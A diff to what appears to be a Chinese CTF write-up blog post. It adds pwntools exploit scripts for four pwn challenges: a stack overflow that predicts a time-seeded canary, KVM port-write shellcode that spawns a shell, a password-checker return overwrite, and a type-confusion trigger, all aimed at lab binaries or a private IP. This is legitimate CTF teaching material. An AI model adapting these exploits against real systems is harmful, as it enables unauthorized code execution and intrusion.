@@ -13,7 +13,7 @@ date: 2018-12-25 12:23:41
 
 <!--more-->
 
-[TOC]
+
 
 ## Web
 
@@ -634,9 +634,68 @@ response = session.post("http://192.168.245.142:6655/upload.php",
 
 简单栈溢出，用了随机数模拟了canary，本地生成随机数即可。
 
+Exp:
+
+```python
+#/usr/bin/env python
+from pwn import *
+from ctypes import *
+
+libc = cdll.LoadLibrary("libc.so.6")
+
+p = process('./overflow')
+
+ret = 0x80485BD
+t = libc.time(0)
+libc.srand(t)
+random = libc.rand()
+
+p.recvline()
+
+payload = 'a'*0x20 + p32(random) + 'a'*0xc + p32(ret)
+#gdb.attach(p)
+p.sendline(payload)
+
+print p.recvline()
+```
+
+
+
 ### kvm
 
 简单的kvm，只需要在vm里面执行端口写操作即可。
+
+Exp:
+
+```python
+#/usr/bin/env python
+from pwn import *
+
+p = process('./kvm')
+
+p.recvuntil("execute: \n")
+
+code = asm('''
+	movabs rax, 0x67616c66
+  	push 4
+  	pop rcx
+  	mov edx, 0x100
+  OUT:
+  	out dx, al
+  	shr rax, 8
+  	loop OUT
+	''', arch = 'amd64')
+
+p.sendline(code)
+
+p.recvuntil("execute again: \n")
+#gdb.attach(p)
+p.sendline(asm(shellcraft.amd64.linux.sh(), arch = 'amd64'))
+
+p.interactive()
+```
+
+
 
 ### password_checker
 
@@ -656,6 +715,40 @@ response = session.post("http://192.168.245.142:6655/upload.php",
 
 具体看 `exp` 和源码
 
+Exp:
+
+```python
+#!/usr/bin/python
+# -*- coding: UTF-8 -*-
+from pwn import *
+context.terminal = ['tmux', 'splitw', '-h']
+context.log_level = "debug"
+
+binary_path = "../dist/pwn"
+
+
+# p = process(binary_path)
+p = remote("172.17.0.2", 20000)
+
+p.recvuntil("welcome.....")
+# 计算出需要输入的字符串长度，让 off + buf 能够写到返回地址
+# 还要去掉 pwd: 这 4 个 字节
+payload = "a" * (0x10c+4-4-2-4)
+
+p.send(payload)
+# gdb.attach(p,"""
+# bp 0x0804873B
+# c
+# """)
+# pause()
+
+
+payload = p32(0x08048674)
+p.sendline(payload)
+
+p.interactive()
+```
+
 
 
 ### type_confusion
@@ -670,6 +763,40 @@ int c2::dump()
 ```
 
 具体看 `exp` 和源码
+
+Exp:
+
+```python
+#!/usr/bin/python
+# -*- coding: UTF-8 -*-
+from pwn import *
+context.terminal = ['tmux', 'splitw', '-h']
+context.log_level = "debug"
+
+binary_path = "../dist/pwn"
+
+
+# p = process(binary_path)
+p = remote("172.17.0.2", 20000)
+
+p.recvuntil("Your choice: ")
+p.sendline("2")
+p.recvuntil("Index: ")
+p.sendline("0")
+
+p.recvuntil("Your choice: ")
+p.sendline("100")
+
+p.recvuntil("Your choice: ")
+p.sendline("1")
+p.recvuntil("Index: ")
+p.sendline("0")
+
+
+p.interactive()
+```
+
+
 
 ## Rev
 
